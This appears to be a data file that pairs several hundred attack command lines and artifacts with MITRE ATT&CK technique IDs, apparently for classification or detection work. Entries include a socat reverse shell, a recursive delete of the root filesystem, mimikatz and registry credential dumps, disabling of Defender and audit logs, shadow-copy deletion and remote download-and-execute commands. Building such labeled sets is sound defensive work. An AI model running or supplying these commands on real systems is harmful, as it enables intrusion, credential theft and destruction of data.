WinDefService,T1036
if (-not [string]::IsNullOrEmpty($outDir) -and -not (Test-Path $outDir)) {,T1083
"New-Item -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Force | Out-Null",T1105
>%TEMP%\golden.txt 2>&1 (,T1558
C:\WINDOWS\ntshrui.dll,T1574
powershell.exe -e $obfuscated_code,T1059
itm4nprivesc -noninteractive -consoleoutput,T1082
IExplorer,T1036
if ($LASTEXITCODE -ne 0) {,T1528
wt.exe,T1547
control.exe {PATH_ABSOLUTE}:evil.dll,T1218
Microsoft.Authorization/roleAssignments/write,T1098
CallWindowProc(),T1106
xwd,T1113
MQTT,T1071
if ($Domain_check.name -ne $null) {,T1110
mpsvc.mui,T1574
copy $Path_ie4uinit %TEMP%\ie4uinit.exe,T1218
"foreach ($f in $dirsFilter) { if ($root -like ""*$f*"") { $match = $true; break } }",T1083
C:\Windows\System32\Magnify.exe,T1546
"wmic /user:$user_name /password:$password /node:""$node"" process call create $process_to_execute",T1047
NtQuerySystemProcessInformation,T1057
reg query “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings”,T1012
/bin/launchctl load,T1569
"echo hello from atomic red team > ""PathToAtomicsFolder\T1140\src\art-expand-source.txt""",T1140
C:\ProgramData\Initech\Initech.exe,T1027
osascript,T1059
SIGCHLD,T1564
"echo ""Unit=$systemd_service_name"" >> $path_to_systemd_timer",T1053
LoadLibraryExA,T1106
/dsgetdc,T1018
[System.IO.Directory]::EnumerateDirectories($userProfile) | ForEach-Object { Scan-Dir $_ },T1083
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f",T1112
/var/run/initd.lock,T1480
mstsc.exe /v:{hostname/ip},T1021
"net group /domain ""Domain controllers""",T1018
CreateWindowExW,T1106
Set-Service -Name EventLog -Status Stopped,T1562
/var/log/messages:,T1070
copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe,T1036
msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext},T1105
pcalua.exe,T1202
Stop-Process $notepad.id,T1055
$position += 1} catch{}},T1012
DATETIME,T1124
MSAccess.exe {REMOTEURL},T1105
"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""",T1105
nslookup,T1016
"if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo ""/etc/init.d not present on this system""; fi",T1007
setspn -T $domain_name -Q */*,T1558
sudo vim /etc/sudoers,T1548
do_vslist,T1083
rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,T1003
c:\windows\syswow64\iscsicpl.exe,T1548
"System.Console.WriteLine(""tweet, tweet"");",T1036
netsh firewall set opmode mode=disable,T1562
"echo ""$command"" > /etc/cron.d/$cron_script_name",T1053
compmgmt.msc,T1053
". ""$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1""",T1134
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad,T1012
public static void Main(string[] args) {,T1036
reg.exe query HKLM\SYSTEM\CurrentControlSet\Control /v SystemStartOptions,T1012
"$bitmap.Save(""$output_file"")",T1113
SHELL32.DLL,T1218
"copy-item ""$env:windir\System32\cmd.exe"" -destination ""$env:allusersprofile\cmd.exe""",T1036
new-itemproperty $key$name -Name https -Value 2 -Type DWORD;,T1112
"cmd.exe /c ""$local_folder\$local_executable"" asreproast /outfile:""$local_folder\$out_file""",T1558
"Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",T1518
rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap,T1003
.dylib,T1129
sudo chmod g+xs $file_to_setuid,T1548
sudo rm -rf $syslog_path,T1070
SHELL PID,T1082
ping -c 4 $ping_target,T1016
ProcessStartInfo,T1564
APPX.%x%x%x%x%x.tmp,T1074
show arp,T1018
KerberosRequestorSecurityToken.GetRequest,T1558
struct lua_State,T1059
Invoke-SMBExec,T1550
"net group ""$group"" ""$username"" /add /domain",T1136
($Users = Get-AzureADUser -All $true) > $null,T1110
Connect-VIServer -Server $vm_host -User $vm_user -Password $vm_pass,T1021
secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt,T1201
catch [System.Net.WebException]{,T1491
fsutil behavior set SymlinkEvaluation R2R:1,T1222
"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}",T1218
"[System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)",T1560
"""$mimikatz_exe"" ""sekurlsa::minidump $input_file"" ""sekurlsa::logonpasswords full"" exit",T1003
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f",T1562
iam.serviceAccountUser,T1548
Software\Microsoft\Windows NT\CurrentVersion\Run,T1547
C:\Windows\system32\cmd.exe /c cmd /c ipconfig /all 2>&1,T1016
sc qc win32times,T1036
systemsetup -gettimezone,T1124
winPEAS -noninteractive -consoleoutput,T1082
DelegateExecute,T1546
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /f",T1546
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:{REMOTEURL:.sct}"""")""))",T1218
WindowPosition,T1564
"Write-Host ""ServiceDll value in the registry has been updated to: $newServiceDll""",T1505
"{if($user.$prop -like ""*password*"")",T1552
"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr",T1105
echo '$command_to_add' >> ~/.bashrc,T1546
ufw disable,T1562
"wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet",T1003
"& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" purge",T1550
"New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore",T1562
kernel32!GetTickCountKernel32,T1497
HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\,T1547
eudcedit,T1548
.JPG,T1036
del %windir%\System32\osk.exe,T1546
auditpol /clear /y,T1562
"Write-Host ""Failed to extract entry $($entry.FullName): $_"" -ForegroundColor Yellow",T1562
sudo kmutil unload -p $module_path,T1547
C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB,T1137
"[System.IO.File]::WriteAllText($notePath, $content, [System.Text.Encoding]::UTF8)",T1491
HKLM\SECURITY\Policy\PolEKList\default,T1003
C:\Windows\System32\osk.exe,T1546
MdMMaintenenceTask,T1036
dlfcn.h,T1129
C:\ProgramData\Apple\Updates\,T1564
Wow64RevertWow64FsRedirection(),T1106
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -gcb -sc trustdmp",T1482
vmsyslogd,T1489
(macOS) or,T1564
"Invoke-RestMethod -Headers @{""Metadata""=""true""} -Method GET -Uri ""http://169.254.169.254/metadata/instance?api-version=2021-02-01"" | ConvertTo-Json -Depth 64 > $output_file",T1552
"dir ""%userprofile%\Desktop\*.*"" >> $output_file",T1083
Set-MpPreference -drtm $True,T1562
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""mount {GUID}"" ""quit"" ""quit""",T1003
"PPID-Spoof -ppid $ppid -spawnto ""$spawnto_process_path"" -dllpath ""$dll_path""",T1134
nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%,T1016
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices,T1012
C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK,T1074
"wmic process get caption,executablepath,commandline /format:csv",T1047
certutil -decode,T1140
"copy ""$service_executable"" ""C:\program.exe""",T1574
wmic.exe,T1047
.enc,T1486
AppData\Local\Microsoft\Windows\Explorer,T1074
"[StructLayout(LayoutKind.Sequential, Pack = 1)]",T1562
"Start-Process ""PowerPnt""",T1137
Get-ADGroupMember,T1087
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\Run""",T1012
reg export HKLM\system %temp%\system,T1003
/parentdomain,T1016
sleep 2,T1562
"echo 'fd = open(""$payload_file_name"", ""wb+"")' >> $python_script_name",T1059
powershell Get-WmiObject -Namespace root\securitycenter2 -Class antivirusproduct,T1518
w64time.dll,T1036
"vaultcmd /listcreds:""Windows Credentials""",T1555
echo '{' >> $rc_service_path/$rc_service_file,T1543
"dir /s ""c:\Program Files\"" >> $output_file",T1083
/Library/Preferences/com.apple.loginwindow,T1564
"New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32' -Name 'ThreadingModel' -Value '$clsid_threading' -PropertyType ""String""",T1546
docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log,T1070
OutputDebugString,T1106
fsutil file createnew C:\Temp\T1105_scp.zip 1048576,T1105
Function Search-Files {,T1005
net stop spooler,T1547
Software\Microsoft\Windows NT\CurrentVersion\Winlogon,T1547
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore",T1070
"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""",T1127
reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default”,T1012
"net localgroup ""$remote_desktop_users_group_name"" $guest_user /add",T1078
"foreach ($machine in get-content -path ""$machine_list"")",T1105
serv.exe,T1036
METADATA,T1027
"Stop-Process -Name ""DirLister""",T1083
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt"" -officeProduct ""Word"" -sub ""ExecChrome""",T1204
&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf,T1484
iptables -D OUTPUT -p tcp --dport 21 -j DROP,T1562
"schtasks /Create /TN ""$task_name"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F",T1053
WerFaultSvc,T1036
SAM,T1003
mmc.exe -Embedding {PATH_ABSOLUTE:.msc},T1218
"sysrc syslogd_enable=""NO""",T1562
break,T1110
"type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe""",T1564
$newModule.CodeModule.AddFromString($vbaCode),T1137
"Write-Host ""Your paste URL: $response""",T1567
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1547
~/.config/autostart,T1547
GetHostByName,T1106
CloseServiceHandle(),T1489
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters,T1574
PutLifecycleConfiguration,T1485
net user /domain,T1087
HKEY_CLASSES_ROOT\\[handler],T1546
Enable-PSRemoting -Force,T1021
if (!(Test-Path -path $path)){,T1546
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, $binary_to_execute"" -Force",T1547
"rundll32.exe ""C:\Program Files\Windows Photo Viewer\PhotoViewer.dll"",ImageView_Fullscreen {REMOTEURL}",T1105
Update.exe --download {REMOTEURL},T1218
"""$gsecdump_exe"" -a",T1003
New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id,T1098
"schtasks.exe /Change /TN ""\Microsoft\Windows\SystemRestore\SR"" /disable",T1490
"), order and casing of characters (",T1027
C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe,T1036
WNetEnumResourceW,T1135
"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""",T1202
netstat -r | grep default,T1018
lshw,T1680
wmic DISKDRIVE get Caption,T1082
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
parted,T1680
chsh --shell /bin/bash nobody,T1078
echo 0> /var/spool/mail/$username,T1070
C:\dbg\ntsd.exe -g notepad.exe,T1546
spoolsv.exe,T1547
%s:%s\n,T1074
osacompile,T1059
net start,T1007
GetIpNetTable,T1016
Add-MpPreference -ExclusionExtension $excludedExts,T1562
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte,T1218
which_openssl=`which openssl`,T1486
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 0 /f",T1112
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f",T1490
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /t REG_MULTI_SZ /d ""W64Time"" /f",T1543
Add-Type -AssemblyName System.DirectoryServices.AccountManagement,T1136
Process32Next,T1106
"vaultcmd /listcreds:""Windows Credentials"" /all",T1555
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 4",T1559
cmd.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List,T1518
"Write-Host ""[i] Establishing connection to: $ip : $port""",T1046
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f,T1569
Lost_{Unique Identifier},T1136
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f",T1547
/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR,T1053
New-Item $file -Force,T1016
mssync.exe,T1036
"Start-Process ""C:\Windows\System32\eventvwr.msc""",T1548
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",T1218
cd /tmp/GoAWSConsoleSpray,T1110
} else{,T1531
"echo ""Description=Atomic Red Team Systemd Service"" >> $systemd_service_path/$systemd_service_file",T1543
C:\Windows\System32\AtBroker.exe,T1546
"""PathToAtomicsFolder\..\ExternalPayloads\remcom.exe"" \\$remote_host /user:$user_name /pwd:$password cmd.exe",T1569
GetKeyboardLayout,T1614
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1060
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f",T1021
Remove-Variable xlBook,T1204
HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf,T1137
"if [ -x ""$(command -v ip)"" ]; then ip addr; else echo ""ip is missing from the machine. skipping...""; fi;",T1016
reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe,T1218
"{Get-ChildItem -Path ""$UsersFolder/$directory/$secondarydirectory"" -ErrorAction SilentlyContinue | Out-File -append $File_to_output}",T1083
grep,T1518
/etc/ystem/system,T1543
$storageAccountObjects += [PSCustomObject]@{,T1619
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,T1564
win_fw.dll,T1574
%HOMEPATH%\Start Menu\Programs\Startup\Realtek {Unique Identifier}.lnk,T1547
sockstat -l 2>/dev/null || true,T1049
Get-NetTCPConnection | ForEach-Object {,T1049
SIGTTIN,T1564
System.Net.HttpWebRequest,T1106
qwerasdf,T1560
Temp\SymbolSourceSymbols\icons,T1113
"Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""",T1547
PostQueuedCompletionStatus(),T1486
Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null,T1562
az ad user create --display-name $username --password $password --user-principal-name $userprincipalname,T1136
"curl -s -A ""HttpBrowser/1.0"" -m3 $domain",T1071
uptime >> $output_file,T1082
nltest /dclist,T1018
gcloud config set project $project-id,T1078
%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom,T1546
devtunnel.exe host -p 8080,T1105
"C:\Windows\system32\cmd.exe /c ""mshta.exe javascript:a=GetObject('script:$url').Exec();close()""",T1059
"New-Item -Path ""HKCU:\Software\Classes\CLSID\$clsid_guid\InprocServer32"" -Value ""$file_name"" -Force | Out-Null",T1574
D8B3.dll,T1055
C:\ProgramData\,T1036
"Invoke-Rubeus -Command ""kerberoast /format:hashcat /nowrap""",T1558
KeepAlive,T1543
HKLM:\SYSTEM\\CurrentControlSet\\Control\\CrashControl\CrashDumpEnabled,T1562
.\PsExec.exe -i -s cmd -accepteula,T1569
autocheck autochk *,T1547
C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\<filename>.dll,T1047
fdisk,T1680
takeown /F C:\Windows\System32\utilman.exe /A,T1546
msiexec /q /i {REMOTEURL},T1218
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key,T1552
./stratus detonate aws.credential-access.ec2-get-password-data --force,T1552
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""esxcli network firewall set --default-action true""",T1562
Install-SSP,T1547
SecurityCenter2.AntiVirusProduct,T1518
net localgroup /domain,T1069
) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (,T1027
copy $vsc_name\Windows\NTDS\NTDS.dit $extract_path\ntds.dit,T1003
"$com.ActivateMicrosoftApp(""5"")",T1021
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f",T1112
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
C:\Windows\System32\Narrator.exe,T1546
C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q,T1070
"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art",T1059
dir c:\Users\,T1087
if ($Result.ReturnValue -eq 0) {,T1546
IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,T1680
NSWorkspace runningApplications(),T1057
0xD5,T1140
"Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""",T1012
"reg add HKCU\SOFTWARE\NetWire /v ""Install Date"" /t REG_SZ /d ""2021-08-30 07:17:27"" /f",T1112
"echo ""ExecStartPre=$execstartpre_action"" >> $systemd_service_path/$systemd_service_file",T1543
Remove-ItemProperty -Path $registryPath -Name $registryValueName,T1562
GUP.exe,T1036
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1,T1003
"Invoke-MalDoc -macroCode $macrocode -officeProduct ""$ms_product""",T1204
tccd,T1548
HKLM\SAM\SAM\Domains\Account\Users\*\V,T1003
POST,T1140
if (Test-Path $fname) {,T1204
"get-process | ?{$_.Description -like ""*carbonblack*""}",T1518
pathExtension,T1106
{42aedc87-2188-41fd-b9a3-0c966feabec1},T1546
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt,T1033
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f",T1112
reg add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f,T1112
"echo ""T1564.001"" > /var/tmp/.hidden-directory/.hidden-file",T1564
"get-process | ?{$_.Description -like ""*mc*""}",T1518
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""$redirection_program"" /f",T1112
echo overwriting...,T1547
echo ldapadd -H ldap://$domain.$top_level_domain:389 -x -D $admin_user -w $admin_password -f tempadmin.ldif,T1136
%SystemRoot%\Temp\lsass.exe /B,T1036
net user $guest_user /active:yes,T1078
"[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""$computer_name"")).Document.ActiveView.ExecuteShellCommand(""c:\windows\system32\calc.exe"", $null, $null, ""7"")",T1021
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableLockWorkstation /t REG_DWORD /d 1 /f",T1112
odbcconf,T1218
"if ($ipAddr -like ""*,*"") {",T1046
Unblock-File -Path $file_path,T1553
/tmp/hello,T1548
"echo ""ExecStartPost=$execstartpost_action"" >> $systemd_service_path/$systemd_service_file",T1543
screencapture $output_file,T1113
%WINDIR%\AppPatch\sysmain.sdb,T1546
"Invoke-MSOLSpray -UserList ""$user_list"" -Password ""$password""",T1110
"wmic /node:<ip> process call create ""cmd /c copy c:\Users\<username>\<path>\backup.pst c:\windows\temp\backup.pst"" copy ""i:\<path>\<username>\My Documents\<filename>.pst""",T1114
"SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR ""[path to self]"" /ST 10:00",T1053
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH},T1105
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force",T1484
copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll,T1574
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" ""PathToAtomicsFolder\T1574.008\bin\calc.cs""",T1574
sudo pkill -SIGTERM $process_pattern,T1489
OptionShutdownSystem,T1529
duo-sid,T1550
NtCreateThreadEx,T1106
"Add-Content $ps_profile -Value ""Start-Process $exe_path""",T1546
New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR,T1012
"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers",T1548
regini.exe {PATH}:hidden.ini,T1564
"mkdir ""$output_dir"" >nul 2>&1",T1140
./LOGS,T1074
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 1",T1559
HKEY_CURRENT_USER\\Console\\WindowsUpdates,T1012
ctrl+d,T1546
Clear Agents Track,T1070
"& ""$PathToAtomicsFolder\T1134.002\src\GetToken.ps1""; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,""cmd.exe"")",T1134
AdjustTokenPrivileges(),T1134
net group /dom,T1087
Import-Module AADInternals -Force,T1552
slideshow.mp4,T1036
rm -rf $folder_to_delete,T1070
LSADUMP::ChangeNTLM,T1098
AzureADConnectAuthenticationAgentService,T1556
"$process.Id | Out-File ""$env:TEMP\click-fix-pid.txt""",T1204
"sc description W64Time ""Maintain date and time synch on all clients and services in the network""",T1543
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows ""AppInit_DLLs""=""pserver32.dll""",T1546
get_tasklist,T1057
"mkdir ""c:\Temp""",T1105
"grep -q ""$search_string"" ""Cookies.binarycookies""",T1555
"Write-Host ""Zip file created: $outputZip\data.zip""",T1005
auditctl,T1562
vShow,T1564
"if (Test-Path ""$falcond_path"") {. ""$falcond_path"" /repair /uninstall /quiet } else { Get-ChildItem -Path ""C:\ProgramData\Package Cache"" -Include ""WindowsSensor.exe"" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq ""Valid"" -and $sig.SignerCertificate.DnsNameList -eq ""CrowdStrike, Inc."") { . ""$_"" /repair /uninstall /quiet; break;}}}",T1562
MpCmdRun.exe -DownloadFile -url $remote_file -path $local_path,T1105
"[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);",T1113
"sc create win32times binPath= ""cmd /c start c:\T1036.004_NonExistingScript.ps1""",T1036
"New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1",T1112
add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename,T1553
TIMEOUT /T 5 >nul 2>&1,T1040
"Start-Process ""shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App""",T1219
pktmon.exe start --etw,T1040
"rundll32 advpack.dll, RegisterOCX {CMD}",T1218
net time \\127.0.0.1,T1124
FindWindow,T1055
Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false,T1021
"rundll32 ""C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init""",T1564
"IF EXIST ""%temp%\Windows_Defender_Cache_Maintenance.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /f )",T1562
GetComputerNameExW,T1106
%TEMP%\,T1074
"/usr/libexec/PlistBuddy -c ""print :CFBundleVersion"" /Applications/Safari.app/Contents/Info.plist",T1518
CredEnumerateA,T1555
extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe},T1105
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1547
"https://"" & domain & ""/agent/scripts/"" & moduleName & "".applescript",T1105
icacls %windir%\System32\osk.exe /grant Administrators:F /t,T1546
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters of Unique Identifier},T1547
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run,T1012
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y,T1036
"if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo ""Virtualization Environment detected""; fi;",T1497
"$which_python -c ""from zipfile import ZipFile; ZipFile('$path_to_output_file', mode='w').write('$path_to_input_file')""",T1560
"ip tcp_metrics show |grep --invert-match ""^127\.""",T1018
SetWindowsHookExW,T1106
"Try {cmd /c ""$AdvancedRun_Location"" /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}",T1562
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties",T1087
wmic.exe shadowcopy delete,T1490
"echo ""import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')"" > ""$SITE_PACKAGES/atomic_hook.pth""",T1546
return $exts -contains $e,T1083
"New-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force",T1562
add-type $updateWallpapercode,T1491
OutputAssemblyDirectory = $InstallerAssemblyDir,T1218
HKCU\Software\Backtsaleht\StubPath,T1547
"echo ""# Default-Start: 2 3 4 5"" >> /etc/init.d/T1543.002",T1543
service cbdaemon stop,T1562
DebuggerIsLogging,T1622
cmd /c certutil -urlcache -split -f $remote_file $local_path,T1105
malloc,T1055
sudo kextunload /Library/Extensions/SoftRAID.kext,T1547
reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak},T1003
'FromBase'+0x40+'String',T1140
"rundll32.exe url.dll,OpenURL ""PathToAtomicsFolder\T1218.011\src\index.hta""",T1218
dd if=/dev/zero bs=1 count=1 >> $file_to_pad #adds null bytes,T1027
HKEY_CURRENT_USER,T1027
%temp%\T1036.007_masquerading.docx.exe,T1036
AppData,T1485
wscript //e:vbscript {PATH}:script.vbs,T1564
"grep ""# THIS IS A COMMENT"" /etc/default/ufw",T1562
echo Triggering fodhelper.exe for potential privilege escalation...,T1548
Generalrecon -consoleoutput -noninteractive,T1082
"[ ""$(uname)"" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null",T1070
"$wc.DownloadFile($url, $output)",T1562
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",T1216
$Users | Foreach-Object {,T1110
ls -l,T1548
HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID,T1497
/etc/init.d/localnet,T1564
GetCurrentProcess,T1057
CustomShellHost.exe,T1218
"net localgroup ""Users""",T1087
